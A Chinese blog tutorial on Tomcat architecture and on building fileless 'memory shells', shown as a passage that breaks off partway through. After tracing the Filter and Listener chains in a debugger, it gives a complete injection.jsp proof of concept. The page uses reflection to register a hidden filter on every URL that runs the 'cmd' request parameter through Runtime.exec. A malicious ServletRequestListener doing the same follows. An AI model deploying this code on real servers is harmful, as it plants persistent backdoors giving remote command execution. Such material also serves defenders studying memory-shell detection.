ServletRequestAttributeListener：对请求对象属性的添加、删除和替换进行监听。 用途： 可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动触发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。\nTomcat架构 Tomcat说明 与Apache服务器对比一下：\nApache是web服务器（静态解析，如HTML） tomcat 是java应用服务器（动态解析，如JSP） 而Tomcat只是一个 servlet容器，也就是说Servlet是一种技术和规范，而Tomcat是实现了Servlet规范的具体容器。\nApache是可以和Tomcat连通的，Apache可以作为web服务器的前端，也就是当客户端请求的是静态页面，则只需要Apache服务器响应请求，如果是动态的，则是Tomcat响应请求后将解析的JSP代码传回给Apache再传回给前端。\n所以tomcat服务器是可以独立运行也可以和Apache连通运行。\nTomcat架构原理 tomcat框架如下所示，主要有server、service、connector、container 四个部分：\n核心部件就是Connector和Container。\nConnector 主要负责进行Socket 通信（基于TCP/IP），用于解析HTTP报文\nContainer 则是处理 Connector 发来的请求，处理内部事务，加载和管理Servlet，由Servlet 具体负责处理 Request 请求。\n下面来稍深入学习一下这些组件。\nserver 即整个Tomcat 服务器，一个tomcat只有一个Server，用于提供具体服务\nservice 如上图所示，一个Tomcat server可以包含多个service，service主要是关联Connector 和 Container ，同时会初始化它下面的其他组件。\n一个 Service 可以设置多个 Connector，但是只能有一个 Container 容器。\nConnector Connector用于连接Service和Container，解析客户端的请求封装成Request对象并转发到Container，以及转发来自Container的响应。每一种不同的Connector都可以处理不同的请求协议，包括HTTP/1.1、HTTP/2、AJP等等。\nContainer 负责处理用户的Servlet请求，它主要有四种容器，分别是Engine、Host、Context、Wrapper。\n它们之间是存在父子关系的。\n四种容器的作用：\nEngine 可以看成是容器对外提供功能的入口，每个Engine是Host的集合，用于管理各个Host，Engine的实现类为 org.apache.catalina.core.StandardEngine。 Host 可以看成一个虚拟主机，一个Tomcat可以支持多个虚拟主机。而一个虚拟主机下可包含多个 Context，Host的实现类为 org.apache.catalina.core.StandardHost。 Context 表示一个 Web 应用程序，每一个Context都有唯一的path，一个Web应用可包含多个 Wrapper，Context的实现类为 org.apache.catalina.core.StandardContext。 Wrapper 表示一个Servlet，负责管理整个 Servlet 的生命周期，包括装载、初始化、资源回收等，Wrapper的实现类为 org.apache.catalina.core.StandardWrapper。 用一张图来表示：\nWrapper组件保存了Web应用的配置信息（这样看来其实就是Context就是对应webapps下的不同的应用程序，其实现的功能不同）。\n并且结合到java web 三大件来看，在到达Context后，可以说listener和filter存在在context中，而servlet存在于wrapper中。\npipeline/valve pipeline中文是流水线，每个容器都有自己的pipeline，代表一个完成任务的管道。流水线上面有很多任务，具体任务是什么呢？就是Valve，中文名字是阀。其中Pipeline和Valve都是接口，对于Pipeline有一个标准实现StandardPipeline。对于Valve不同的容器有它自己的实现，比如StandardWrapper容器实现的StandardWrapperValve\n内存马学习 Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。\nServlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。\nFilter 型内存马 在前面我们学习了三大件中的Filter（过滤器），web请求都会经过 filter 之后才会到 Servlet ，并且我们可以通过自定义过滤器来做到对用户的一些请求进行拦截修改等操作。\n那么如果我们能动态创建 一个 filter 并且将其放在最前面，我们的filter 就会最先执行，这样只要我们往 filter 中添加恶意代码，就可以进行命令执行。\n相关类了解 **FilterDefs：**存放FilterrDef的数组，FilterDef 中存储着我们过滤器名，过滤器实例等基本信息。\nFilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息\nFilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern\nFilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter\nApplicationFilterChain：调用过滤器链\nApplicationFilterConfig：获取过滤器\nApplicationFilterFactory：组装过滤器链\nWebXml：存放 web.xml 中内容的类\nContextConfig：Web应用的上下文配置类\nStandardContext：Context接口的标准实现类，一个 Context 代表一个 Web 应用，其下可以包含多个 Wrapper\nFilter链 流程分析 环境：\nTomcat 9.0.93 先以实例简单看看Filter链的流程： 创建两个文件，内容分别为：\nTestFilter.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package filter; import javax.servlet.*; import java.io.IOException; import org.apache.catalina.core.StandardWrapper; public class TestFilter implements Filter { public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\u0026#34;第一个Filter 初始化创建\u0026#34;); } public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { System.out.println(\u0026#34;第一个Filter执行过滤操作\u0026#34;); filterChain.doFilter(servletRequest,servletResponse); } public void destroy() { } } TestDemo.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package filter; import javax.servlet.*; import java.io.IOException; public class TestDemo implements Filter { public void init(FilterConfig filterConfig) throws ServletException { System.out.println(\u0026#34;第二个Filter 初始化创建\u0026#34;); } public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { System.out.println(\u0026#34;第二个Filter执行过滤操作\u0026#34;); filterChain.doFilter(servletRequest,servletResponse); } public void destroy() { } } 然后web.xml中添加：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;filter\u0026lt;/filter-name\u0026gt; \u0026lt;!--名字 --\u0026gt; \u0026lt;filter-class\u0026gt;filter.TestFilter\u0026lt;/filter-class\u0026gt;\u0026lt;!--位置 --\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;filter\u0026lt;/filter-name\u0026gt;\u0026lt;!--调用 --\u0026gt; \u0026lt;url-pattern\u0026gt;/filter\u0026lt;/url-pattern\u0026gt;\u0026lt;!--表示访问filter路由的web资源都是被拦截，而/*表示所有的URL都会被拦截 --\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;filter1\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;filter.TestDemo\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;filter1\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/filter\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 然后运行tomcat服务器，访问filter路由，成功输出在控制台上：\n现在这里就尝试一下调试。\n————————————\n这里需要导入catalina.jar包来更好看一些，这个包在tomcat的lib目录下，直接在idea里面拉进去即可： 然后就可以了。\n——————————————\n然后我们在TestFilterr.java的filterChain的doFilter打断点，然后开始调试。\n开启调试后，再访问一下 /filter 即可成功断上：\n看一下这里的参数情况：\n可以看到这里有三个filter，这里第一个和第二个filter都是我们自定义的filter，第三个filter是tomcat自带的filter。此时的filterChain为ApplicationFilterChain类实例，所以此时会调用ApplicationFilterChain的doFilter()方法。\n单击F7跟进一下这个filterChain的doFilter()方法： 这里的if进行了Globals.IS_SECIRITY_ENABLED判断，看是否开启了全局安全服务。\nF7进入下一步，没有进入这个if条件，直接到了else内的代码：\n然后这里就会调用ApplicationFilterChain的internalDoFilter()方法： 看参数，无疑会进入这个if条件，利用代码为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 if (this.pos \u0026lt; this.n) { ApplicationFilterConfig filterConfig = this.filters[this.pos++]; try { Filter filter = filterConfig.getFilter(); if (request.isAsyncSupported() \u0026amp;\u0026amp; !filterConfig.getFilterDef().getAsyncSupportedBoolean()) { request.setAttribute(\u0026#34;org.apache.catalina.ASYNC_SUPPORTED\u0026#34;, Boolean.FALSE); } if (Globals.IS_SECURITY_ENABLED) { Principal principal = ((HttpServletRequest)request).getUserPrincipal(); Object[] args = new Object[]{request, response, this}; SecurityUtil.doAsPrivilege(\u0026#34;doFilter\u0026#34;, filter, classType, args, principal); } else { filter.doFilter(request, response, this); } } 然后就调用了filters变量，这个变量在类中是定义的了，如下：\n并且看此时的变量对应情况： 和之前一样，有三个过滤器。然后继续看if条件语句里面的利用代码： 此时pos的值为1，并且这里的pos++是后置的，所以会先获取到filters数组下标为1的filter，然后再+1，所以此时会获取到我们定义的第二个filter。\n验证成功。\n然后就是调用 getFilter()方法获取到类实例： 然后这里的if条件同样不会进入，直接进入else调用TestDemo的doFilter()方法： 顺理成章，第二个自定义的TestDemo的doFilter()方法是同样的，然后就会到Tomcat自带的filter，即WsFilter： 于是进入到了WsFilter类的doFilter()方法:\n这里的if条件没有通过，直接进入else语句： 这里的chain类实例为ApplicationFilterChain，又会调用一次doFilter()方法 ==》再调用internalDoFilter()方法，但是此时在这个internalFilter()方法中，前面我们都是满足了这个if条件：\n但是这里并没有满足，直接进入else语句，再然后的一步一步的条件判断，最后会调用servlet的service()方法：\n也就是说最后一个Filter会调用service()方法来处理web请求。\n——————\n正向分析filter流程分析结束。\n/filter前流程分析 在doFilter() 方法之前，整个流程如图：\n。在前面我们时直接分析的访问filter链之后的过程，现在就主要着重于filters是如何被赋值的：\n在前面也分析过了，其实这里的filterrConfig可以看作是一个filter，那么我们现在就看一下这个filters是如何赋值的（这个filters即所属ApplicationFilterChain类的变量）。\n发现在 StandardWrapperValve 类的invoke方法中有这个定义：\n1 ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet); 打断点跟进一下这个ApplicationFilterFactory类的createFilterChain()方法： 这里进入到了else语句，然后继续就是赋值filterChain：\n（标红的即进入的语句）\n可以看到这里确实将filterChain赋值为了 ApplicationFilterChain类的实例。\n但现在只是一个空的ApplicationFilterChain对象。\n再往后看，有如下代码：\n1 2 StandardContext context = (StandardContext)wrapper.getParent(); FilterMap[] filterMaps = context.findFilterMaps(); 调用getParent()获取当前的Context，也就是当前的应用，然后从Context中获取filterMaps，filtermaps就是web.xml中我们写入的filter。\n再然后就是遍历这个数组中的值：\n重点都标出来了，这里就是遍历filterMap。再来看一下这个for循环具体代码：\n如果当前请求的url与FilterMap中的urlPattern匹配，就会调用 findFilterConfig 方法在 filterConfigs 中寻找对应 filterName名称的 FilterConfig，然后如果不为null，就进入else语句，将filterConfig添加到filterChain中，跟进一下这个ApplicationFilterChain类的addFIlter()方法： 很明显就是将filter都装进先前定义的ApplicationFilterChain的filters中。\n————————\nfilterChain实例赋值大概就是这样。\n我们再回到StandardWrapperValve类中，在invoke之后的代码中，有调用filterChain 的 doFIlter() 方法，有两个，调试一下，发现确实会调用其中一个doFIlter()方法：\n然后自然就会调用ApplicationFilterChain类的doFIlter()方法，然后调用internalDoFilter()方法，过程在前面的Filter链的也有说。\n只不过这里还是有不同的： 这里的n就只为1，所以这里获取到的filter直接就是我们前面调用分析时最后的tomcat自带的WsFilter。\n后面也就是前面分析过了的，简单给给流程： WsFilter#doFilter == \u0026gt; ApplicationFilterChain#doFilter ==\u0026gt; ApplicationFilterChain#internalDoFilter\n然后同样调用了service()方法： 这里是因为我们访问的是/，在/路由我们没有自定义filter，所以这里就只会调用一次doFilter。\n所以如果我们访问/filter路由，就还会进行一次上面的过程，只不过就是我们前面的分析Filter 链的流程。\n补充 补充一下前面的createFilterChain()方法中获取context部分的地方，我这里是用上了自定义的两个filter，如下代码：\n我们现在来看一下获取到的context的重点内容，加一个断点看一下（这里以我的自定义了两个filter为例）：\n在这个StandardContext对象中包含了filterConfigs、filterDefs、filterMaps，现在来分别说明一下。\nfilterConfigs 在StandardContext中的定义为：\n点开前面断点情况如下：\n是以键值对的形式存储的，有三个，以一个为例：\n可以看出filterConfigs包含了当前上下文的信息 StandardContext、filterDef等信息\n这里的 filterDef 存放了filter 的定义，包括filterClass、filterName等信息。其实就是web.xml中的 \u0026lt;filter\u0026gt;标签。\nfilterDefs 它在StandardContext中的定义为： 点开如下：\nfilterDefs是一个HashMap，以键值对的形式存储 filterDef，点开其中一个看看：\nfilterMaps filterMaps 中就储存到了很多有用的信息，以array的形式存放了各filter的路径映射信息，其对应的是web.xml中的\u0026lt;filter-mapping\u0026gt;标签：\n这里我将自定义的两个filter标出来了。从中可以看出filter顺序是对的，也有一些必要的信息。\n————\n所以后面的获取filterMaps的代码:\n应该就是获取到就是filterMaps。\n——————\n从上面就可以看出来Context含有filter的必要信息。\n如何攻击 动态注册Filter 从前面的分析可以知道，只要我们向web.xml中注册一个filter，然后我们将这个filter对应代码设置成恶意代码，就能实现命令注入。\n但是在实际环境中是不可能有这种情况的。那么该如何解决呢。\n在前面的分析中，我们分析了ApplicationFilterChain的filters的赋值过程，调用了ApplicationFilterFactory类的createFilterChain()方法，其中的filterMaps即为其中重要的一环。\n既然关键都是filterMaps了，那么这里同样的很关键的变量就是context： 这里就会获取到StandardContext实例。\n所以我们可以借用Java反射来修改filterConfigs，filterDefs，filterMaps这三个变量，将我们恶意构造的FIltername以及对应的urlpattern存放到FilterMaps，从而达到内存注入的操作\n说明一下动态添加恶意Filter的思路：\n获取当前web应用的StandardContext对象 创建恶意Filter 使用FilterDef对Filter进行封装，并添加必要的属性 创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中 使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中。 获取StandardContext对象 StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此有很多方法来获取StandardContext对象。\n这里要用到ServletContext，简单说明一下ServletContext跟StandardContext的关系：\nTomcat中实现ServletContext接口的有如下三个：\n（内表示继承的父类实现了接口但本类没有直接引入接口）\n这里重点关注ApplicationContext类和ApplicationContextyFacade类。\n在web应用中获取的ServletContext实际上是ApplicationContextFacade对象，对ApplicationContext进行了封装： 而ApplicationContext实例中又包含了StandardContext实例：\n当我们能直接获取 request 的时候，可以直接将Servlet 转为 StandardContext，从而获取context。\n获取context流程如下：\nServletContext -\u0026gt; ApplicationContext：\n1 2 3 4 ServletContext servletContext = rerquest.getSession().getServletContext(); Field context0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); context0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)context0.get(servletContext); 这里是为了获取到(ApplicationContext)context，即context变量对应的ApplicationContext类实例。\nApplicationContext -\u0026gt; StandardContext：\n1 2 3 Field context1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); context1.setAccessible(true); StandardContext standardContext = (StandardContext)context1.get(applicationContext) 这里是为了获取到(StandardContext)context，所以现在我们就获取到了StandardContext类型的context，和前面createFilterChain()方法中获取到的context变量对应。\n创建恶意filter 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 Filter evilFilter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { String cmd; if ((cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;)) != null) { Runtime runtime = Runtime.getRuntime(); runtime.exec(cmd); return; } filterChain.doFilter(servletRequest,servletResponse); } @Override public void destroy() { } }; 如何封装 既然前面我们获取到了StandardContext型的context，在前面的补充中，也说明这个context变量中很重要的三点：filterConfigs、filterDefs、filterMaps。\n所以其实这里的重点就是如何更改这三个变量从而在createFilterChain()方法中获取filterMaps时可以加入恶意的filter。\n看StandardContext源码，先说明其中几个方法：\naddFilterDef()\n添加一个filterDef到Context：\n这里的filterDefs变量定义： 所以就是添加一个键值对进去。\naddFilterMapBefore\n添加filterMap到所有filter最前面： ApplicationFilterConfig\n还有个就是filterConfigs，但是这个不是单纯的一个add\u0026hellip;就可以加入，代码如下：\n再看一下filterConfigs变量的定义： 所以同样是放入键值对。\n从代码中可以看出在这里会调用ApplicationFilterrConfig的构造方法： ————————————\n现在就可以开始尝试构造了：\nFilterDef\n这个类位于org.apache.tomcat.util.descriptor.web.FilterDef;，我们可以实例化一个FilterDef对象，并将恶意构造的恶意类添加到filterDef中：\n1 2 3 4 5 6 7 8 9 10 11 12 //前面创建恶意filter是用的匿名内部类的方式创建的，当然也可以直接public声明一个恶意的filter类，利用方式不同而已。 String name = \u0026#34;badFilter\u0026#34;; FilterDef filterDef = new FilterDef(); //设置filter名称 filterDef.setFilterName(name) //声明filter类代码源 filterDef.setFilterClass(evilFilter.getClass().getName()); filterDef.setFilter(evilFilter); //添加filterDef standardContext.addFilterDef(filterDef); 可以和前面补充里给出的相对应的filteDefs的图片对比一下，大概就能知道这里使用的方法是干嘛的。\nfilterMaps\n这个类位于org.apache.tomcat.util.descriptor.web.FilterMap，在这里我们需要实例化一个FilteMap对象，并将filteMap添加到所有filte最前面：\n1 2 3 4 5 6 7 8 9 10 FilterMap filterMap = new FilterMap(); //设置拦截路由 filterMap.addURLPattern(\u0026#34;/*\u0026#34;); //name=badFilter filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); //添加我们的filterMap到所有filterr最前面 standardContext.addFilterMapBefore(filterMap); 这里重点解释一下filterMap.setDispatcher(DispatcherType.REQUEST.name());，这个方法是用来设置FilterMap的当前状态，该状态表示何时应用过滤器。在这里表示一个直接的客户端请求，也就是当用户直接请求一个资源或者重定向到达该资源时，会触发过滤器。\nfilterConfig\nfilterConfigs中存放filterConfig的数组，并且从前面补充板块的图中，可以看出filterConfig中存放有filterDef和filte对象等信息。\n先获取当前filterConfigs信息：\n1 2 3 Field configs = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); configs.setAccessible(true); Map filterConfigs = (Map)configs.get(standardContext); 再通过反射获取ApplicationFilterConfig的构造器并初始化：\n1 2 3 Constructor constructor1 = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(standardContext,filterDef); 然后就是将这个实例化的ApplicationFilterConfig放进filterConfigs中，如下：\n1 2 //name=badFilter filterConfigs.put(name,o); 至此就已经全部分析完了。\n动态注入 结合前面的分析，其实已经比较清楚了。总结的流程如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 //获取ApplicationContext类型的context ServletContext facade = request.getSession().getServletContext(); Field field0 = facade.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(facade); //获取StandardContext类型的context Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //创建恶意filter Filter evilFilter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { String cmd; if ((cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;)) != null) { Runtime runtime = Runtime.getRuntime(); runtime.exec(cmd); return; } filterChain.doFilter(servletRequest,servletResponse); } @Override public void destroy() { } }; //设置基本的预定义的filtername String name = \u0026#34;badFilter\u0026#34;; //创建filterDef FilterDef filterDef = new FilterDef(); filterDef.setFilterName(name); filterDef.setFilterClass(evilFilter.getClass().getName()); filterDef.setFilter(evilFilter); standardContext.addFilterDef(filterDef); //创建filterMap FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\u0026#34;/*\u0026#34;); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); //创建filterConfig所需的ApplicationFilterConfig Constructor constructor1 = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(standardContext,filterDef); //放入filterConfigs Field configs = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); configs.setAccessible(true); Map filterMaps = (Map)configs.get(standardContext); filterMaps.put(name,o); 最终POC injection.jsp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 \u0026lt;%-- Created by IntelliJ IDEA. User: ASUS Date: 2024/9/1 Time: 13:34 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Map\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Constructor\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationFilterConfig\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.Context\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.String\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;% //获取ApplicationContext类型的context ServletContext facade = request.getSession().getServletContext(); Field field0 = facade.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(facade); //获取StandardContext类型的context Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); //创建恶意filter Filter evilFilter = new Filter() { @Override public void init(FilterConfig filterConfig) throws ServletException { } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { String cmd; if ((cmd = servletRequest.getParameter(\u0026#34;cmd\u0026#34;)) != null) { Runtime runtime = Runtime.getRuntime(); runtime.exec(cmd); return; } filterChain.doFilter(servletRequest,servletResponse); } @Override public void destroy() { } }; //设置基本的预定义的filtername String name = \u0026#34;badFilter\u0026#34;; //创建filterDef FilterDef filterDef = new FilterDef(); filterDef.setFilterName(name); filterDef.setFilterClass(evilFilter.getClass().getName()); filterDef.setFilter(evilFilter); standardContext.addFilterDef(filterDef); //创建filterMap FilterMap filterMap = new FilterMap(); filterMap.addURLPattern(\u0026#34;/*\u0026#34;); filterMap.setFilterName(name); filterMap.setDispatcher(DispatcherType.REQUEST.name()); standardContext.addFilterMapBefore(filterMap); //创建filterConfig所需的ApplicationFilterConfig Constructor constructor1 = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(standardContext,filterDef); //放入filterConfigs Field configs = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); configs.setAccessible(true); Map filterMaps = (Map)configs.get(standardContext); filterMaps.put(name,o); //加上提示 out.println(\u0026#34;success inject\u0026#34;); %\u0026gt; 然后开启服务器，访问一下injection.jsp：\n随后就可以任意命令执行了：\n并且这个内存马是一直存在的，直到这个tomcat服务器关闭。\n还有需要注意的就是tomcat7 与 tomcat8 在FilterDef和FilterMap这两个类所属的包名不一样：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;!-- tomcat 8/9 --\u0026gt; \u0026lt;% page import = \u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34; %\u0026gt; \u0026lt;% page import = \u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34; %\u0026gt; \u0026lt;!-- tomcat 7 --\u0026gt; \u0026lt;%@ page import = \u0026#34;org.apache.catalina.deploy.FilterMap\u0026#34; %\u0026gt; \u0026lt;%@ page import = \u0026#34;org.apache.catalina.deploy.FilterDef\u0026#34; %\u0026gt; Listener型内存马 listener能够监听事件从而达成一些此熬过。在请求网站的时候，程序先执行listener监听器的内容： Listener -\u0026gt; Filter -\u0026gt; Servlet\nLIstenerr 三个域对象：\n1 2 3 ServletContextListener //服务器启动和终止时触发 HttpSessionListener //有关session操作时触发 ServletRequestListener //访问服务时触发 毫无疑问，这里最好用的就是SerrvletRequestListener，当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法。\n基本Listener构造 要构造listener必须实现EventListener接口。这个接口的定义如下：\n很多类都继承了这个接口。如果我们想要实现内存马就需要找一个每个请求都会被触发的Listener。\n在这里需要用到的是ServletRequestListener接口，如下： 这个接口中的方法用于监听ServletRequest对象的创建的销毁，从前面的学习中，我们很容易知道这里的ServletRequest就是请求的“对象”。\n当我们访问任意资源，无论是servlet、jsp还是静态资源，都会触发requestInitialized方法。\n简单测试一下： Listener.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package listener; import javax.servlet.ServletRequestEvent; import javax.servlet.ServletRequestListener; public class Listener implements ServletRequestListener{ public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\u0026#34;执行了销毁\u0026#34;); } public void requestInitialized(ServletRequestEvent sre) { System.out.println(\u0026#34;执行了创建\u0026#34;); } } web.xml\n1 2 3 4 5 6 7 8 9 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;listener\u0026gt; \u0026lt;listener-class\u0026gt;listener.Listener\u0026lt;/listener-class\u0026gt; \u0026lt;/listener\u0026gt; \u0026lt;/web-app\u0026gt; 启动tomcat后，就会触发Listener的监听请求，访问任意的路径都会触发：\n上面是在开启时进行的两次创建销毁，下面就是我随便输的访问路径执行的一次创建销毁。\nListener流程分析 应用运行前 这里需要了解一个知识点，tomcat在启动应用的时候，ContextConfig类会去读取配置文件。\n所以我们直接去ContextConfig类里面去看一下，直接定位到一个方法： 可以看到这里读取了webxml。\n这个方法主要就是读取数据，简单看看其中的方法，读取了filter等组件：\n调用了addFilterDef()方法来放入读取出来的filterDef。\n————\n在这里我们主要关注listener的读取，直接关键字搜索发现有如下方法：\n打断点看一下这里的参数情况： 这里的context确实是StandardContext的实例，并且这里的webxml确实是有我们自定义的listener的： 正好对应了我们并没有在web.xml中定义filter，所以这是就是读取的我们自定义的web.xml中的数据。\n————\n上述就是读取配置文件，里面加载了Listener。在读取完配置文件后，中间还有一大部分过程略过，最后会调用StandardContext的listenerStart()方法，这个方法做了一些基础的安全检查，然后完成start业务。\n应用运行过程 我们直接打断点自定义listener()方法的requestInitialized()方法，然后调试：\n来看现在的调用栈： 定点于标重点部分，调用的fireRequestInitEvent()方法：\n这里就调用到了requestInitialized()方法。\n在这个fireRequestInitEvent()方法最开始的地方调用了一个getApplicationEventListeners()方法：\n这个方法就是获取所有的Listener对象，打断点来看一下： 获取到了我自定义的Listener类。\n如果有多个listener，代码在后面也是使用了for循环来分别初始化Listener。\n并且在这个StandardContext中：\n前面那个getApplicationEventListeners()方法其实可以算作是listener的”getter方法“，\n并且StandardContext类还提供了“setter方法”，setApplicationEventListeners()：\n所以我们可以尝试向StandardContext的变量applicationEventListenersList中添加一个恶意Listener。\n注入过程 先获取当前环境的StandardContext对象：\n1 2 3 4 5 6 7 ServletContext servletContext = request.getSession().getServletContext(); Field field0 = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field0.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext)field0.get(servletContext); Field field1 = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); field1.setAccessible(true); StandardContext standardContext = (StandardContext)field1.get(applicationContext); 准备一个恶意Listener：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ServletRequestListener badListener = new ServletRequestListener(){ public void requestDestroyed(ServletRequestEvent sre) { System.out.println(\u0026#34;销毁\u0026#34;); } public void requestInitialized(ServletRequestEvent sre) { ServletRequest request = (ServletRequest)sre.getServletRequest(); String shell = request.getParameter(\u0026#34;cmd\u0026#34;); if(shell != null){ try { Runtime.getRuntime().exec(shell); } catch (IOException e) { e.printStackTrace(); } } } }; 两个点说明一下：\nbadListener 为什么是ServletRequestListener型 